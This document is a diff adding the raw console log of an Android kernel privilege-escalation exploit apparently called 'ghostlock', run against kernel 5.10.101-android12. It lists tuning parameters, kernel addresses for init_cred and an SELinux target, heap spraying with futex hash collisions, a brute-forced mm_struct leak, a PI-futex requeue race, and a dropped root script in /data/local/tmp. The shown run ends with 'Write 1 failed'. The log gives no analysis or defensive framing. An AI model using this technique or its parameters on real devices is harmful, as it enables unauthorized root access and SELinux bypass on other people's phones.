@@ -1,0 +1,191 @@
+[33m[*] [0mkernel: 5.10.101-android12-9-gece0cc04d1a5
+[32m[+] [0mresolved profile loaded: 5.10.101-android12-9-gece0cc04d1a5
+[33m[*] [0mcpu pair: main=4 consumer=5
+[33m[*] [0mruntime home=/data/local/tmp script=/data/local/tmp/.ghostlock_root.sh
+[33m[*] [0mdebug.execution.begin release=5.10.101-android12-9-gece0cc04d1a5
+[33m[*] [0mdebug.execution.recommended_cpus.main=4
+[33m[*] [0mdebug.execution.recommended_cpus.consumer=5
+[33m[*] [0mdebug.execution.selected_cpus.main=4
+[33m[*] [0mdebug.execution.selected_cpus.consumer=5
+[33m[*] [0mdebug.execution.heap.prepare_max_attempts=4
+[33m[*] [0mdebug.execution.heap.prepare_timeout_ms=240000
+[33m[*] [0mdebug.execution.heap.kernelsnitch_timeout_ms=60000
+[33m[*] [0mdebug.execution.race.route_wait_ms=1000
+[33m[*] [0mdebug.execution.race.setup_settle_us=50000
+[33m[*] [0mdebug.execution.race.state_poll_interval_us=1000
+[33m[*] [0mdebug.execution.stages.w1_attempts=15
+[33m[*] [0mdebug.execution.stages.w1_settle_us=100000
+[33m[*] [0mdebug.execution.stages.w1_scratch_repair_attempts=3
+[33m[*] [0mdebug.execution.stages.w2_attempts=15
+[33m[*] [0mdebug.execution.stages.w2_settle_us=100000
+[33m[*] [0mdebug.execution.stages.w3_chain_rounds=3
+[33m[*] [0mdebug.execution.stages.w3_attempts=6
+[33m[*] [0mdebug.execution.stages.w3_settle_us=50000
+[33m[*] [0mdebug.execution.routes.tcp_zerocopy.attempts=0
+[33m[*] [0mdebug.execution.routes.tcp_zerocopy.arm_sequence=0
+[33m[*] [0mdebug.execution.routes.tcp_zerocopy.post_receive_hold_iterations=0
+[33m[*] [0mdebug.execution.routes.select_stack.enter_delay_us=0
+[33m[*] [0mdebug.execution.routes.select_stack.timeout_us=0
+[33m[*] [0mdebug.execution.routes.select_stack.consumer_max_calls=4
+[33m[*] [0mdebug.execution.routes.select_stack.consumer_burst_calls=2
+[33m[*] [0mdebug.execution.handoff.pre_dispatch_settle_ms=2000
+[33m[*] [0mdebug.execution.handoff.module_poll_attempts=30
+[33m[*] [0mdebug.execution.handoff.module_poll_interval_ms=100
+[33m[*] [0mdebug.execution.handoff.enforce_poll_attempts=200
+[33m[*] [0mdebug.execution.handoff.enforce_poll_interval_ms=100
+[33m[*] [0mdebug.execution.end
+[33m[*] [0msoc: qcom/other; kernel_phys_load=0xa8000000
+[33m[*] [0minit_cred image=ffffffc0829c0670 alias=ffffff802a9c0670
+[33m[*] [0mroot script written path=/data/local/tmp/.ghostlock_root.sh bytes=6081
+[33m[*] [0miomem cache: no usable dump, keeping the built-in geometry
+[32m[+] [0mstartup context pid=11967 uid=2000 euid=2000 gid=2000 egid=2000 boot_ms=627754 attr=u:r:shell:s0 enforce=1
+[32m[+] [0mstartup limits pid=11967 NoNewPrivs=0 Seccomp=0 Seccomp_filters=0
+[32m[+] [0mbuild config pid=11967 label=ghostlock_oplus slide=pselect main=pselect
+[32m[+] [0mp0 profile pid=11967 phys_offset=0000000080000000 kernel_phys_load=00000000a8000000 delta=0000000028000000 slide_logger=ffffff802a9a1310 bootid_data=ffffff802ac6b4dc init_task=ffffff802a9abe00 root_tg=ffffff802aba2000 sysctl_bootid=ffffff802ac6b4dc
+[33m[*] [0mp0 kernel_phys_load=00000000a8000000 delta=0000000028000000
+[33m[*] [0mmain thread running on cpu=4
+[33m[*] [0m[T+0ms] exploit start
+[33m[*] [0m[T+0ms] pre-W1 drain
+[33m[*] [0mW1: SELinux attempt 1/1
+[33m[*] [0m=== W1: SELinux === target=0xffffff802ac51b20 mode=1 leaf=0
+[33m[*] [0m[T+106ms]   heap spray start
+[33m[*] [0mparameters cpu (16 online, 8 possible, futex table 2048) mm_struct sz (3c0) mm slab order (3) thread cnt (8) collisions (8)
+[33m[*] [0m[spray] mm spray + kernelsnitch ready (cpu=8) +97ms
+[33m[*] [0mstart finding collisions
+[33m[*] [0mpass scan=8/4 verify=16/8
+[33m[*] [0mtarget    0000007f724500d0
+[33m[*] [0m[spray] finding futex collisions... +215ms
+[33m[*] [0m  collision scan 256/65536
+[33m[*] [0m  collision scan 512/65536
+[33m[*] [0m  collision scan 768/65536
+[33m[*] [0m  collision scan 1024/65536
+[33m[*] [0m  collision scan 1280/65536
+[33m[*] [0m  collision scan 1536/65536
+[33m[*] [0m  collision scan 1792/65536
+[33m[*] [0m  collision scan 2048/65536
+[33m[*] [0m  collision scan 2304/65536
+[33m[*] [0m  collision scan 2560/65536
+[33m[*] [0m  collision scan 2816/65536
+[33m[*] [0m  collision scan 3072/65536
+[33m[*] [0m  collision scan 3328/65536
+[33m[*] [0m  collision scan 3584/65536
+[33m[*] [0m  collision scan 3840/65536
+[33m[*] [0m  collision scan 4096/65536
+[33m[*] [0m  collision scan 4352/65536
+[33m[*] [0m  collision scan 4608/65536
+[33m[*] [0m  collision scan 4864/65536
+[33m[*] [0m  collision scan 5120/65536
+[33m[*] [0m  collision scan 5376/65536
+[33m[*] [0m  collision scan 5632/65536
+[33m[*] [0m  collision scan 5888/65536
+[33m[*] [0m  collision scan 6144/65536
+[33m[*] [0m  collision scan 6400/65536
+[33m[*] [0m  collision scan 6656/65536
+[33m[*] [0m  collision scan 6912/65536
+[33m[*] [0m  collision scan 7168/65536
+[33m[*] [0m  collision scan 7424/65536
+[33m[*] [0m  collision scan 7680/65536
+[33m[*] [0m  collision scan 7936/65536
+[33m[*] [0m  collision scan 8192/65536
+[33m[*] [0m  collision scan 8448/65536
+[33m[*] [0m  collision scan 8704/65536
+[33m[*] [0m  collision scan 8960/65536
+[33m[*] [0m  collision scan 9216/65536
+[33m[*] [0m  collision scan 9472/65536
+[33m[*] [0m  collision scan 9728/65536
+[33m[*] [0m  collision scan 9984/65536
+[33m[*] [0m  collision scan 10240/65536
+[33m[*] [0m  collision scan 10496/65536
+[33m[*] [0m  collision scan 10752/65536
+[33m[*] [0m  collision scan 11008/65536
+[33m[*] [0m  collision scan 11264/65536
+[33m[*] [0m  collision scan 11520/65536
+[33m[*] [0m  collision scan 11776/65536
+[33m[*] [0m  collision scan 12032/65536
+[33m[*] [0m  collision scan 12288/65536
+[33m[*] [0m  collision scan 12544/65536
+[33m[*] [0m  collision scan 12800/65536
+[33m[*] [0m  collision scan 13056/65536
+[33m[*] [0m  collision scan 13312/65536
+[33m[*] [0m  collision scan 13568/65536
+[33m[*] [0m  collision scan 13824/65536
+[33m[*] [0m  collision scan 14080/65536
+[33m[*] [0m  collision scan 14336/65536
+[33m[*] [0m  collision scan 14592/65536
+[33m[*] [0m  collision scan 14848/65536
+[33m[*] [0m  collision scan 15104/65536
+[33m[*] [0m  collision scan 15360/65536
+[33m[*] [0m  collision scan 15616/65536
+[33m[*] [0m  collision scan 15872/65536
+[33m[*] [0m  collision scan 16128/65536
+[33m[*] [0m  collision scan 16384/65536
+[33m[*] [0m  collision scan 16640/65536
+[33m[*] [0m  collision scan 16896/65536
+[33m[*] [0m  collision scan 17152/65536
+[33m[*] [0m  collision scan 17408/65536
+[33m[*] [0m  collision scan 17664/65536
+[33m[*] [0m  collision scan 17920/65536
+[33m[*] [0m  collision scan 18176/65536
+[33m[*] [0m  collision scan 18432/65536
+[33m[*] [0m  collision scan 18688/65536
+[33m[*] [0m  collision scan 18944/65536
+[33m[*] [0m  collision scan 19200/65536
+[33m[*] [0m  collision scan 19456/65536
+[33m[*] [0m  collision scan 19712/65536
+[33m[*] [0m  collision scan 19968/65536
+[33m[*] [0m  collision scan 20224/65536
+[33m[*] [0m  collision scan 20480/65536
+[33m[*] [0mscreening piled candidates limit=16
+[33m[*] [0m  piled   0000006c62946c70 scan=160 verify=123
+[33m[*] [0m  piled   0000006c61643458 scan=156 verify=123
+[33m[*] [0m  piled   0000006c5f3f9208 scan=155 verify=121
+[33m[*] [0m  piled   0000006c5fd30bc0 scan=145 verify=124
+[33m[*] [0m  piled   0000006c638d38d8 scan=134 verify=124
+[33m[*] [0m  piled   0000006c63380e40 scan=129 verify=123
+[33m[*] [0m  piled   0000006c6337de28 scan=126 verify=123
+[33m[*] [0m  piled   0000006c5f4be830 scan=118 verify=123
+[33m[*] [0m[spray] early collision screen 8/7 at 31%
+[33m[*] [0mverifying 8 candidates after pile drain
+[33m[*] [0m  drained  0000006c62946c70 t=123 after=5
+[33m[*] [0m  drained  0000006c61643458 t=123 after=5
+[33m[*] [0m  drained  0000006c5f3f9208 t=121 after=5
+[33m[*] [0m  drained  0000006c5fd30bc0 t=124 after=5
+[33m[*] [0m  drained  0000006c638d38d8 t=124 after=5
+[33m[*] [0m  drained  0000006c63380e40 t=123 after=6
+[33m[*] [0m  drained  0000006c6337de28 t=123 after=5
+[33m[*] [0m  drained  0000006c5f4be830 t=123 after=5
+[33m[*] [0m  collider 0000006c62946c70 t=123 repiled=135
+[33m[*] [0m  collider 0000006c61643458 t=123 repiled=123
+[33m[*] [0m  collider 0000006c5f3f9208 t=121 repiled=122
+[33m[*] [0m  collider 0000006c5fd30bc0 t=124 repiled=123
+[33m[*] [0m  collider 0000006c638d38d8 t=124 repiled=122
+[33m[*] [0m  collider 0000006c63380e40 t=123 repiled=124
+[33m[*] [0m  collider 0000006c6337de28 t=123 repiled=123
+[33m[*] [0mfound 7 collisions
+[33m[*] [0m[spray] futex collisions found +717ms
+[33m[*] [0mstart bruteforcing
+[33m[*] [0m[  5] start finding mm_struct [ffffff8780000000-ffffff8900000000]
+[33m[*] [0m[  6] start finding mm_struct [ffffff8900000000-ffffff8a80000000]
+[33m[*] [0m[  1] start finding mm_struct [ffffff8180000000-ffffff8300000000]
+[33m[*] [0m[  4] start finding mm_struct [ffffff8600000000-ffffff8780000000]
+[33m[*] [0m[  2] start finding mm_struct [ffffff8300000000-ffffff8480000000]
+[33m[*] [0m[  0] start finding mm_struct [ffffff8000000000-ffffff8180000000]
+[33m[*] [0m[  3] start finding mm_struct [ffffff8480000000-ffffff8600000000]
+[33m[*] [0m[  7] start finding mm_struct [ffffff8a80000000-ffffff8c00000000]
+[33m[*] [0mfound mm_struct ffffff88ce7d7800
+[33m[*] [0m[spray] mm_struct leaked=0xffffff88ce7d7800 +845ms
+[33m[*] [0m[spray] payload ready +846ms
+[33m[*] [0mdone
+[33m[*] [0mprepare_kernel_page ok attempt=1 +904ms
+[33m[*] [0m[T+1010ms]   heap spray done
+[33m[*] [0m[route] creating waiter/owner/consumer
+[33m[*] [0mconsumer thread running on cpu=5
+[33m[*] [0m[route] waiter parked; owner started
+[33m[*] [0m[route] CMP_REQUEUE_PI ret=-1 errno=35; waiting route_done
+[33m[*] [0mE3: tree fields planted for target=0xffffff802ac51b20
+[33m[*] [0mmulticast route status=0 clean=1/1 step=0 errno=0
+[33m[*] [0mmcast ghost disarm ret=-1 errno=110
+[33m[*] [0m[route] route_done status=0 clean=1/1 step=0 errno=0 calls=4 success=4
+[33m[*] [0m[route] threads joined
+[33m[*] [0m[T+3017ms]   PI route done
+[31m[-] [0mWrite 1 failed
